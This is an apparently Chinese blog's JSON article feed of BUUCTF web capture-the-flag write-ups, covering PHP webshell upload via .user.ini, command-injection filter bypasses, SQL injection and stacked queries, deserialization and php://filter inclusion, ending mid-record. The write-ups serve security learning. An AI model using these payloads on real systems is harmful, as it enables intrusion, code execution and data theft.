{"total":14,"pageSize":10,"pageCount":2,"data":[{"title":"buu-web零碎2.0","slug":"buu-web零碎2-0","date":"2021-02-06T03:03:45.000Z","updated":"2021-02-06T09:55:22.680Z","comments":true,"path":"api/articles/buu-web零碎2-0.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h2><p>（…user.ini的利用<br>上传user.ini进行上传后门。  ）<br>文件上传，先尝试  shell.txt  </p>\n<pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]) ?&gt;  </code></pre>\n<p>显示 &lt;? in contents!，即对&lt;?进行了过滤，<br>一句话木马换个形式：  </p>\n<pre><code>&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;  </code></pre>\n<p>报错显示 exif_imagetype:not image!<br>（exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。）<br>简单来说就是根据文件头来判断文件的类型<br>下边说下常见的几种类型<br>1.JPG:FFD8FFFE00<br>2.GIF89a:474946383961<br>3.PNG:89504E470D0A<br>然后对一句话木马前加了GIF的文件头发现还是不行，能上传成功，但是是把他当做图片处理了而不是一个文件。<br>于是找大佬们的WP  </p>\n<p>需要用到.user.ini<br>指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);<br>涉及到两个设置：auto_prepend_file和auto_append_file<br>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）  </p>\n<p>可以上传一个.user.ini 文件，当我们对目录中的任何php文件进行访问时，都会调用.user.ini中指的文件以php的形式进行读取。<br>所以我们写一个.user.ini进行上传。（一定要加文件幻术头）  </p>\n<pre><code>GIF89a\nauto_prepend_file=text.jpg  </code></pre>\n<p>将text.jpg包含到要执行的php文件中</p>\n<p>先上传.user.ini文件.然后再建立text.jpg文件（图片马)  </p>\n<pre><code>GIF89a\n&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code></pre>\n<p>然后直接访问目录得到flag  </p>\n<hr>\n<h2 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h2><p>打开一看啥也没，像是注入题，输1抓包，放包，在请求头里有提示：  </p>\n<ul>\n<li>Hint: select * from ‘admin’ where password=md5($pass,true)<br>要考察md5($password,true)的用法:  </li>\n</ul>\n<p>当md5后的hex转换成字符串后，如果包含’or’这样的字符串，整个sql变成：  </p>\n<pre><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;6&lt;trash&gt;&#39;  </code></pre>\n<p>就可以注入<br>提供一个字符串：ffifdyop<br>md5后：276f722736c95d99e921722cf9ed621c<br>再转成字符：’or’6  </p>\n<ul>\n<li>所以 password=ffifdyop </li>\n</ul>\n<p>放包出现</p>\n<pre><code>&lt;script&gt;window.location.replace(&#39;./levels91.php&#39;)&lt;/script&gt;</code></pre>\n<p>访问/levels91.php<br>看源码  </p>\n<pre><code>&lt;!--\n$a = $GET[&#39;a&#39;];\n$b = $_GET[&#39;b&#39;];\n\nif($a != $b &amp;&amp; md5($a) == md5($b))&#123;\n// wow, glzjin wants a girl friend.\n--&gt;</code></pre>\n<p>a和b值不相等，但他们对应的MD5值相等  </p>\n<ul>\n<li><p>数组弱类型比较，用‘a[]=1&amp;b[]2’绕过<br>得代码：  </p>\n  <?php\n  error_reporting(0);\n  include \"flag.php\";\n\n  highlight_file(__FILE__);\n\n  if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n  echo $flag;\n  }\n构造param1[]=1&param2[]=2</li>\n<li><p>和上面的如出一辙，不同的是上面是get传参，这个要用到post传参，用火狐，得出flag</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>逆转思维（哦哦）<br>这个题考察php伪协议</p>\n<pre><code>&lt;?php  \n$text = $_GET[&quot;text&quot;];\n$file = $_GET[&quot;file&quot;];\n$password = $_GET[&quot;password&quot;];\nif(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;\necho &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;\nif(preg_match(&quot;/flag/&quot;,$file))&#123;\n    echo &quot;Not now!&quot;;\n    exit(); \n&#125;else&#123;\n    include($file);  //useless.php\n    $password = unserialize($password);\n    echo $password;\n&#125;\n&#125;\nelse&#123;\n    highlight_file(__FILE__);\n&#125;\n?&gt;  </code></pre>\n<p>file_get_contents()函数把整个文件读入一个字符串中。</p>\n<p>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”))<br>需要传入text且其内容为welcome to the zjctf，利用data协议：（先将传入内容转化为Base64）    </p>\n<pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=  </code></pre>\n<p>include($file);处可利用利用 php 流 filter：读取提示useless.php文件内容<br>用base64读取useless.php</p>\n<pre><code>file=php://filter/read=convert.base64-encode/resource=useless.php  </code></pre>\n<p>解码后得到：  </p>\n<pre><code>&lt;?php  \n\nclass Flag&#123;  //flag.php  \n    public $file;  \n    public function __tostring()&#123;  \n        if(isset($this-&gt;file))&#123;  \n            echo file_get_contents($this-&gt;file); \n            echo &quot;&lt;br&gt;&quot;;\n        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);\n        &#125;  \n    &#125;  \n&#125;  \n?&gt;    </code></pre>\n<p>在本地进行序列化得到结果  </p>\n<pre><code>&lt;?php\n\nclass Flag&#123;\npublic $file=&#39;flag.php&#39;;  \n    public function __tostring()&#123;  \n        if(isset($this-&gt;file))&#123;  \n            echo file_get_contents($this-&gt;file); \n            echo &quot;&lt;br&gt;&quot;;\n        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);\n        &#125;  \n    &#125;  \n&#125; \n$password=new Flag();\necho serialize($password);\n?&gt;</code></pre>\n<p>得到结果为：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br>最终payload:</p>\n<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></pre>\n","text":"[SUCTF 2019]CheckIn（…user.ini的利用<br>上传user.ini进行上传后门。  ）<br>文件上传，先尝试  shell.txt  &lt;?php @eval($_POST[&#39;shell&#39;]) ?&gt;  显示 &lt;? in ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"buu-16-30","slug":"buu-16-30","count":1,"path":"api/tags/buu-16-30.json"}]},{"title":"buu-web零碎1.0","slug":"buu-web零碎1.0","date":"2021-02-04T07:55:09.000Z","updated":"2021-02-06T09:55:20.288Z","comments":true,"path":"api/articles/buu-web零碎1.0.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h2><p>考察命令执行漏洞绕过<br>？ip=127.0.0.1|ls 看当前目录下的文件<br>？ip=127.0.0.1|cat index.php 看index.php文件  </p>\n<p>发现空格被过滤 绕过空格的方法如下：<br>$IFS<br>${IFS}<br>$IFS$数字<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}<br>经过尝试，发现第三个没被过滤掉<br>？ip=127.0.0.1|cat$IFS$6index.php 可查看文件</p>\n<h2 id=\"index-php文件如下\"><a href=\"#index-php文件如下\" class=\"headerlink\" title=\"index.php文件如下\"></a>index.php文件如下</h2><pre><code>|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123;\necho preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match);\ndie(&quot;fxck your symbol!&quot;);\n &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;\ndie(&quot;fxck your space!&quot;);\n &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;\ndie(&quot;fxck your bash!&quot;);\n&#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;\ndie(&quot;fxck your flag!&quot;);\n &#125;\n $a = shell_exec(&quot;ping -c 4 &quot;.$ip);\n echo &quot;\n\n&quot;;\n print_r($a);\n&#125;  </code></pre>\n<p>发现index.php中过滤了很多字符，过滤了bash命令，flag字符串，还有一系列的符号，虽然过滤了bash命令我们还可以使用sh。sh的脚本基本上都可以在bash下运行。<br>现在访问flag.php</p>\n<h3 id=\"sh\"><a href=\"#sh\" class=\"headerlink\" title=\"sh\"></a>sh</h3><p>payload:<br>?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh<br>(将“cat flag.php”经base64转码得到)</p>\n<h3 id=\"变量拼接\"><a href=\"#变量拼接\" class=\"headerlink\" title=\"变量拼接\"></a>变量拼接</h3><p>index.php代码有一个变量a,可以用变量a代替被过滤的flag中的某个字符，从而绕过flag过滤，进而读取flag<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p>\n<h3 id=\"内联注释\"><a href=\"#内联注释\" class=\"headerlink\" title=\"内联注释\"></a>内联注释</h3><p>/?ip=127.0.0.1;cat$IFS$2<code>ls</code><br>将反引号内命令的输出结果作为输入来进行命令执行，这样flag.php和index.php的结果都能直接查看  </p>\n<hr>\n<h2 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源码，说有WAF，看到提示有一个calc.php文件，访问<br>访问结果，传参为num，并且有黑名单，过滤了字母t，r，[，]等，基本上一句话是不管用。<br>有eval()函数，说不定有代码执行漏洞：eval()代码执行漏洞，1,2<br>num传参测试： ？num=123123,可显，数字可显，字母不可显 字母都被WAF拦截，利用PHP的字符串解析特性绕过waf，PHP字符串解析特性。<br><u>由于php在解析url中的参数时，保存前会把num前面的空格去掉再解析，所以在num前加空格可绕过WAF</u>，在num前加个空格，弹出之前代码中的提示，只要在黑名单中，都会提示what are you want to do?<br>可以查phpinfo()<br>payload:      ? num=phpinfo()<br>PHP函数：<br>scandir()：以数组形式返回指定目录中的文件和目录<br>var_dump()：输出变量的相关信息。<br>var_dump()：显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>file_get_contents()：把整个文件读入一个字符串中。  </p>\n<ul>\n<li>var_dump(scandir(chr(47))): 查看文件目录（“/”被过滤了，可以使用chr(47)来进行表示，进行目录读取）</li>\n<li>?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  读取flag  </li>\n</ul>\n<hr>\n<h2 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h2><p>后缀 <a href=\"http://www.zip找到备份文件/\">www.zip找到备份文件</a>  </p>\n<hr>\n<pre><code>&lt;?php\ninclude &#39;class.php&#39;;\n$select = $_GET[&#39;select&#39;];\n$res=unserialize(@$select);\n?&gt;</code></pre>\n<hr>\n<pre><code>&lt;?php\ninclude &#39;flag.php&#39;;\n\nerror_reporting(0);\n\n\nclass Name&#123;\nprivate $username = &#39;nonono&#39;;\nprivate $password = &#39;yesyes&#39;;\n\npublic function __construct($username,$password)&#123;\n    $this-&gt;username = $username;\n    $this-&gt;password = $password;\n&#125;\n\nfunction __wakeup()&#123;\n    $this-&gt;username = &#39;guest&#39;;\n&#125;\n\nfunction __destruct()&#123;\n    if ($this-&gt;password != 100) &#123;\n        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;\n        echo &quot;You name is: &quot;;\n        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;\n        echo &quot;You password is: &quot;;\n        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;\n        die();\n    &#125;\n    if ($this-&gt;username === &#39;admin&#39;) &#123;\n        global $flag;\n        echo $flag;\n    &#125;else&#123;\n        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;\n        die();\n\n    &#125;\n&#125;\n&#125;\n?&gt;  </code></pre>\n<p>看了代码没啥头绪，看大佬们的wp，这个题考察反序列化<br>序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>\n<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。<br><a href=\"https://blog.csdn.net/v1040375575/article/details/111646602?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%20%20%20%20%20$res=unserialize\">https://blog.csdn.net/v1040375575/article/details/111646602?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%20%20%20%20%20$res=unserialize</a>  </p>\n<p>  对传入的select反序列化后满足 password = 100 和username === ‘admin’<br>然后构造反序列化：<br>O是对象，s是字符串，i是数字,脚本：</p>\n<pre><code>&lt;?php\nclass Name&#123;\n    private $username = &#39;nonono&#39;;\n    private $password = &#39;yesyes&#39;;\n    public function __construct($username,$password)&#123;\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    &#125;\n    public function __wakeup()&#123;\n        $this-&gt;username = &quot;guests&quot;;\n    &#125;\n    public function fun()&#123;\n        echo $this-&gt;username;echo &quot;&lt;br&gt;&quot;;echo $this-&gt;password;\n    &#125;\n&#125;\n$a = serialize(new Name(&quot;admin&quot;,100));\necho $a;\n?&gt;</code></pre>\n<p>因为是private修饰的所以要加%00充当空格  </p>\n<pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre>\n<p>payload：</p>\n<pre><code>url+?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre>\n","text":"[GXYCTF2019]Ping Ping Ping考察命令执行漏洞绕过<br>？ip=127.0.0.1|ls 看当前目录下的文件<br>？ip=127.0.0.1|cat index.php 看index.php文件  发现空格被过滤 绕过空格的方法如下：<br>$IFS<b","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"buu前15个题","slug":"buu前15个题","count":1,"path":"api/tags/buu前15个题.json"}]},{"title":"Node.js学习笔记","slug":"Node-js学习笔记","date":"2021-02-02T07:35:04.000Z","updated":"2021-02-03T02:31:39.972Z","comments":true,"path":"api/articles/Node-js学习笔记.json","excerpt":"","keywords":null,"cover":"images/nodejs1.0.png","content":"<p>今天自学node.js，先康康《菜鸟笔记》。从《菜鸟笔记》中学习，然后写一些感悟和自己的看法。<br>冲冲冲！</p>\n<h2 id=\"Node-js创建第一个应用\"><a href=\"#Node-js创建第一个应用\" class=\"headerlink\" title=\"Node.js创建第一个应用\"></a>Node.js创建第一个应用</h2><p><img src=\"images/nodejs1.0.png\" alt=\"nodejs1.0\"><br>说node.js可以完成后端代码的一条龙服务     </p>\n<h3 id=\"创建应用的具体步骤\"><a href=\"#创建应用的具体步骤\" class=\"headerlink\" title=\"创建应用的具体步骤\"></a>创建应用的具体步骤</h3><p><a href=\"https://www.runoob.com/nodejs/nodejs-http-server.html\">https://www.runoob.com/nodejs/nodejs-http-server.html</a><br>具体操作：可行</p>\n","text":"今天自学node.js，先康康《菜鸟笔记》。从《菜鸟笔记》中学习，然后写一些感悟和自己的看法。<br>冲冲冲！Node.js创建第一个应用 [Figure] 具体操作：可行","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"runoob.com","slug":"runoob-com","count":1,"path":"api/tags/runoob-com.json"}]},{"title":"SQL注入","slug":"SQL注入","date":"2021-02-01T09:54:11.000Z","updated":"2021-02-06T09:55:32.151Z","comments":true,"path":"api/articles/SQL注入.json","excerpt":"","keywords":null,"cover":"images/buusql1.0.png","content":"<h1 id=\"1-buu-SUCTF-2019-EasySQL\"><a href=\"#1-buu-SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"1.buu-[SUCTF 2019]EasySQL\"></a>1.buu-[SUCTF 2019]EasySQL</h1><p><img src=\"images/buusql1.0.png\" alt=\"buu-sql.png\"><br>发现昨天用的堆叠注入可以直接查表<br><img src=\"images/buusql1.0.png\" alt=\"buu-sql.png\"><br>发现了表Flag,但是无法用show columns from Flag读取其中的列<br>好，看看大佬们的WP：“后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag，但作为一道题目，from一定是from flag”猜出后端源码select $_POST[‘query’] || flag from Flag,<br><a href=\"https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187\">https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187</a><br>挺无语的，直接看大佬讲解吧<br>今天先搞别的        </p>\n<hr>\n<h1 id=\"buu-极客大挑战-2019-EasySQL\"><a href=\"#buu-极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"buu-[极客大挑战 2019]EasySQL\"></a>buu-[极客大挑战 2019]EasySQL</h1><p>进入靶机<br><img src=\"images/buusql2.0.png\" alt=\"buu-sql.png\"><br>用万能密码试一试<br><img src=\"images/buusql2.1.png\" alt=\"buu-sql.png\"><br>用户名和密码都输入   admin’ or ‘1’=’1<br>得到flag     </p>\n<h1 id=\"极客大挑战-2019-LoveSQL\"><a href=\"#极客大挑战-2019-LoveSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]LoveSQL\"></a>[极客大挑战 2019]LoveSQL</h1>","text":"1.buu-[SUCTF 2019]EasySQL [Figure] 得到flag     [极客大挑战 2019]LoveSQL","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","count":1,"path":"api/tags/SQL注入.json"}]},{"title":"buu-Secretfile","slug":"buu-Secretfile","date":"2021-02-01T09:05:26.000Z","updated":"2021-02-03T03:40:45.433Z","comments":true,"path":"api/articles/buu-Secretfile.json","excerpt":"","keywords":null,"cover":"images/buu2.1.0.png","content":"<h2 id=\"buu-web-极客大挑战-2019-Secret-File\"><a href=\"#buu-web-极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"buu-web-[极客大挑战 2019]Secret File\"></a>buu-web-[极客大挑战 2019]Secret File</h2><p><img src=\"images/buu2.1.0.png\" alt=\"1\"><br>打开一看，画风比较诡异<br><img src=\"images/buu2.1.1.png\" alt=\"2\"><br>也看不出啥东西来，看看源码<br><img src=\"images/buu2.1.2.png\" alt=\"1\"><br>发现了一个带php后缀的链接，打开<br><img src=\"images/buu2.1.3.png\" alt=\"1\"><br>有秘密，点击，发现到了终点，且提示“回去看看”<br><img src=\"images/buu2.1.4.png\" alt=\"1\"><br>提醒抓包，抓包试试<br><img src=\"images/buu2.1.5.png\" alt=\"1\"><br>又得到一个链接<br><img src=\"images/buu2.1.6.png\" alt=\"1\"><br>给了代码，发现过滤了很多东西，可以用之前文件包含时候学到的php伪协议，构造payload，页面返回base64</p>\n<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php      </code></pre>\n<p><img src=\"images/buu2.1.7.png\" alt=\"1\"><br>解码得到flag</p>\n","text":"buu-web-[极客大挑战 2019]Secret File [Figure] 解码得到flag","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"文件包含，php伪协议","slug":"文件包含，php伪协议","count":1,"path":"api/tags/文件包含，php伪协议.json"}]},{"title":"buu-随便注","slug":"buu-随便注","date":"2021-01-31T10:20:27.000Z","updated":"2021-02-03T02:31:38.629Z","comments":true,"path":"api/articles/buu-随便注.json","excerpt":"","keywords":null,"cover":"images/buu-sbz1.png","content":"<h1 id=\"buu-web第二题，随便注\"><a href=\"#buu-web第二题，随便注\" class=\"headerlink\" title=\"buu-web第二题，随便注\"></a>buu-web第二题，随便注</h1><p>题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br><img src=\"images/buu-sbz1.png\" alt=\"buu-sbz1.png\"><br>接下来，根据常规操作，判断出字符型注入，两个字段，当我们开心地进行联合注入时，发现<br><img src=\"images/buu-sbz2.png\" alt=\"buu-sbz1.png\"><br>select被注释掉了，也就是不能联合查询找flag了，所以要绕过select，用别的方法。<br>看了好多大佬的wp，说因可以输入多个语句，因此可以用堆叠查询<br>先查数据库（没啥用）<br><img src=\"images/buu-sbz3.png\" alt=\"buu-sbz1.png\"><br>查表如下，有两个<br><img src=\"images/buu-sbz4.png\" alt=\"buu-sbz1.png\"><br>再查表中的列如下(字符串为表名操作时要加反引号)，发现了flag<br><img src=\"images/buu-sbz5.png\" alt=\"buu-sbz1.png\">     </p>\n<h2 id=\"方法1-预编译\"><a href=\"#方法1-预编译\" class=\"headerlink\" title=\"方法1.预编译\"></a>方法1.预编译</h2><p>flag在第一个表中，查flag，select被过滤，大佬说用预编译的方式绕过这个过滤，构造     </p>\n<pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from\n`1919810931114514`;&#39;);prepare aaa from @sql;EXECUTE aaa; --+     </code></pre>\n<p>出现如下图,发现还过滤了set和prepare<br><img src=\"images/buu-sbz6.png\" alt=\"buu-sbz1.png\"><br>利用文件上传漏洞大小写绕过，重新构造payload如下：     </p>\n<pre><code>-1&#39;;Set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from\n`1919810931114514`;&#39;);Prepare aaa from @sql;EXECUTE aaa; --+</code></pre>\n<p>欢天喜地，得到flag<br><img src=\"images/buu-sbz7.png\" alt=\"buu-sbz1.png\">    </p>\n<hr>\n<h2 id=\"方法2-handler查询\"><a href=\"#方法2-handler查询\" class=\"headerlink\" title=\"方法2.handler查询\"></a>方法2.handler查询</h2><p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>handler可以用于MyISAM和InnoDB表。<br>使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果。<br>构造payload：</p>\n<pre><code>-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#    </code></pre>\n<p><img src=\"images/buu-sbz8.png\" alt=\"buu-sbz1.png\"><br>简单快捷，恐怖如斯！     </p>\n<hr>\n<h2 id=\"方法3-修改表名和列名\"><a href=\"#方法3-修改表名和列名\" class=\"headerlink\" title=\"方法3.修改表名和列名\"></a>方法3.修改表名和列名</h2><p>由上面知道flag在表“1919810931114514”中，查表words<br><img src=\"images/buu-sbz9.png\" alt=\"buu-sbz1.png\"><br>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id，我们可以利用数据库修改表名和列名的方法，将我们要查询的表名改成第二个，就可以查询出想要的内容了<br>操作如下：<br>alter table words rename to aaa;先把原来的words表名字改成其他<br>alter table 1919810931114514 rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>构造payload如下：</p>\n<pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>\n<p>然后我们用1’ or 1=1 –+直接就能得到     </p>\n","text":"buu-web第二题，随便注题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br> [Figure] 构造payload如下：1&#39;; alter table words rename to aaaa;alter table `1919810931114514` ren","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"堆叠查询&预编译","slug":"堆叠查询-预编译","count":1,"path":"api/tags/堆叠查询-预编译.json"}]},{"title":"buu-Warmup","slug":"buu-Warmup","date":"2021-01-31T09:28:53.000Z","updated":"2021-01-31T10:19:47.246Z","comments":true,"path":"api/articles/buu-Warmup.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"根据题目得到代码如下，开始代码审计\"><a href=\"#根据题目得到代码如下，开始代码审计\" class=\"headerlink\" title=\"根据题目得到代码如下，开始代码审计\"></a>根据题目得到代码如下，开始代码审计</h2><pre><code>&lt;?php\n    highlight_file(__FILE__);\nclass emmm\n&#123;\n    public static function checkFile(&amp;$page)\n    &#123;\n        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];\n        //得到另外一个文件hint.php，包含得到flag的文件名\n\n        //isset()判断变量是否声明，is_string()判断变量是否是字符串\n        if (! isset($page) || !is_string($page)) &#123;\n            echo &quot;you can&#39;t see it&quot;;\n            return false;\n        &#125;\n\n        //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真\n        if (in_array($page, $whitelist)) &#123;            \n            return true;\n        &#125;\n\n        //过滤问号的函数(如果$page的值有？则从?之前提取字符串)\n        $_page = mb_substr(\n            $page,\n            0,\n            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)\n        );\n\n        //第二次检测传进来的值是否匹配白名单列表$whitelist\n        if (in_array($_page, $whitelist)) &#123;\n            return true;\n        &#125;\n\n        //对$page进行url解码\n        $_page = urldecode($page);\n\n         //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)\n        $_page = mb_substr(\n            $_page,\n            0,\n            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)\n        );\n\n        //第三次检测传进来的值是否匹配白名单列表$whitelist\n        if (in_array($_page, $whitelist)) &#123;\n            return true;\n        &#125;\n\n        //若以上都没通过，则返回false\n        echo &quot;you can&#39;t see it&quot;;\n        return false;\n    &#125;\n&#125;\n\n//---------------------------------------------------------------\n//这里就到了文件包含，需要传入的参数file不为空且是字符串，经过class emmm的检测，即emmm返回真，则包含file    \nif (! empty($_REQUEST[&#39;file&#39;])\n    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])\n    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])\n) &#123;\n    include $_REQUEST[&#39;file&#39;];\n    exit;\n&#125; else &#123;\n    echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;\n&#125;  \n?&gt;</code></pre>\n<hr>\n<p>观察源码发现hint.php，打开发现<br>flag not here, and flag in ffffllllaaaagggg<br>如果满足相应的条件，include引入文件。只需使emmm::checkFile($_REQUEST[‘file’]返回值为true，利用../跳转目录读取flag即可。<br>payload为：file=source.php?/../ffffllllaaaagggg，经过mb_strpos为source.php?/../ffffllllaaaagggg?,  但是mb_strpos这个函数只返回首次出现的位置，所以还是会返回第一个？的位置，而mb_substr截取函数，从0开始截取一直到第一个？的位置，截取内容为source.php，恰好能与白名单中的进行匹配，可以return true;，所以通过第一次截取进行绕过<br>ffffllllaaaagggg文件和index.php不在同一个目录下，所以读取的是上级目录。构造payload <a href=\"http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg%EF%BC%8C%E6%89%BE%E5%88%B0flag%EF%BC%88%E5%88%A9%E7%94%A8/%E4%BD%BFsource.php?%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9C%80%E5%90%8Einclude%E5%88%A9%E7%94%A8../%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96flag%E5%8D%B3%E5%8F%AF%EF%BC%89\">http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg，找到flag（利用/使source.php?成为一个不存在的目录，最后include利用../跳转目录读取flag即可）</a>  </p>\n<ul>\n<li>注意：../ 有多少个不一定，因为不知道flag在底几层目录里，需要从没有开始一次加一个去尝试。</li>\n</ul>\n","text":"根据题目得到代码如下，开始代码审计&lt;?php    highlight_file(__FILE__);class emmm&#123;    public static function checkFile(&amp;$page)    &#123;        $whi","link":"","raw":null,"photos":[],"categories":[],"tags":[]},{"title":"文件包含","slug":"文件包含","date":"2021-01-16T02:15:37.000Z","updated":"2021-01-18T10:09:19.688Z","comments":true,"path":"api/articles/文件包含.json","excerpt":"","keywords":null,"cover":"images/bugku6.1.png","content":"<h1 id=\"文件包含漏洞\"><a 